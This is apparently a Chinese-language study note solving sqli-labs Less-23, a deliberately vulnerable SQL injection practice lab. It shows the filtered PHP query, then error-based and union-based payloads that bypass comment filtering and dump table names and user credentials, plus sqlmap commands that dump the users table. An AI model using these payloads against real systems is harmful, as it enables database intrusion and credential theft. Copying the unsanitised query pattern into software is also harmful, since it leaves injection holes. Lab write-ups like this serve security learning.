---
title: less23
url: https://www.yuque.com/u29002979/ep2zrx/xs62ebs63h03zyaa
---

```bash
$reg = "/#/";
$reg1 = "/--/";
$replace = "";
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

通过源码发现**#和--都被被过滤为空字符串**
只有想方法将闭合符号消耗完毕，让后台能够接收，处理掉原有的闭合方式 单引号'

> Please input the ID as parameter with numeric value

```bash
id=-1' or updatexml(1,concat(0x7e,(select database()),0x7e),1) and '1'='1
```

`**and '1'='1**`将后面的单引号闭合消耗完毕。

按照常规get型传参注入 <a name="rL8Hl"></a>

# 查找注入点

`?id=1'`

> **Warning**: mysql\_fetch\_array() expects parameter 1 to be resource, boolean given in **E:\phpstudy\_pro\WWW\sql.com\Less-23\index.php** on line **38**
> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

闭合方式单引号' <a name="lh1Tf"></a>

# 猜解列名数量

`?id=1' order by 4 **and '1'='1**`
`?id=1' order by 3 **and '1'='1**`
字段 3个 <a name="sFNaN"></a>

# 判断回显点

`?id=-1' union select 1,2,**'3**`
回显点2,3 <a name="xvLPE"></a>

# SQL注入

```bash
查看所有数据库名称
?id=-1' union select 1,(select database()),'3 
查看使用数据表名称
?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),'3
查看字段名
?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),'3
查看字段
?id=-1' union select 1,(select group_concat(username,0x7e,password) from users),'3
```

<a name="iqiEO"></a>

# sqlmap

```bash
探测注入点
sqlmap -u http://192.168.31.193/Less-23/?id=1 --batch
爆破数据库名
sqlmap -u http://192.168.31.193/Less-23/?id=1 --batch --current-db
爆破数据表
sqlmap -u http://192.168.31.193/Less-23/?id=1 --batch -D security --tables 
脱库
sqlmap -u http://192.168.31.193/Less-23/?id=1 --batch -D security -T users --dump
```
